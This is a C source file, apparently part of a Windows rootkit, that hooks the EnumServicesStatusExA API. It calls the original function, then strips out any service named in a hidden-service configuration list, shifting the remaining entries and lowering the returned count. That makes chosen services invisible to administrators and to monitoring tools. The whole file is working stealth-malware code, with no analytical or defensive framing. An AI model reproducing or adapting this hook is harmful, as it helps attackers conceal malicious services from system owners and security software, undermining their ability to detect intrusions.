#include <winsock2.h>
#include <windows.h>
#include <time.h>
#include <winsvc.h>
#include "ntdll.h"

#include "config.h"

#include "enumservicesstatusexa.h"

// advapi32.EnumServicesStatusExA
BOOL WINAPI NewEnumServicesStatusExA(
	SC_HANDLE hSCManager,
	SC_ENUM_TYPE InfoLevel,
	DWORD dwServiceType,
	DWORD dwServiceState,
	LPBYTE lpServices,
	DWORD cbBufSize,
	LPDWORD pcbBytesNeeded,
	LPDWORD lpServicesReturned,
	LPDWORD lpResumeHandle,
	LPCTSTR pszGroupName
)
{
	BOOL b;
	
	// call original function
	b=OldEnumServicesStatusExA(
			hSCManager,
			InfoLevel,
			dwServiceType,
			dwServiceState,
			lpServices,
			cbBufSize,
			pcbBytesNeeded,
			lpServicesReturned,
			lpResumeHandle,
			pszGroupName
			);

	if (b || GetLastError()==ERROR_MORE_DATA)
	{
		DWORD dwNrOfSvc,dwCount;
		ENUM_SERVICE_STATUS_PROCESSA* pEnum=(ENUM_SERVICE_STATUS_PROCESSA*)lpServices;

		lpResumeHandle=NULL;
		dwNrOfSvc=*lpServicesReturned;
		for (dwCount=0;dwCount<dwNrOfSvc;dwCount++)
		{
			if (config_CheckString(ConfigHiddenService,pEnum->lpServiceName,0))
			{
				RtlZeroMemory(pEnum->lpDisplayName,strlen(pEnum->lpDisplayName));
				RtlZeroMemory(pEnum->lpServiceName,strlen(pEnum->lpServiceName));
				RtlCopyMemory((char*)pEnum,(char*)pEnum+sizeof(ENUM_SERVICE_STATUS_PROCESSA),sizeof(ENUM_SERVICE_STATUS_PROCESSA)*(dwNrOfSvc-(dwCount+1))); // hide handle
        		RtlZeroMemory((char*)pEnum+sizeof(ENUM_SERVICE_STATUS_PROCESSA)*(dwNrOfSvc-(dwCount+1)),sizeof(ENUM_SERVICE_STATUS_PROCESSA)); // delete last row
        		(*lpServicesReturned)--; // change number of services
			}
			else
				pEnum++;
		}
	}

	return b;
}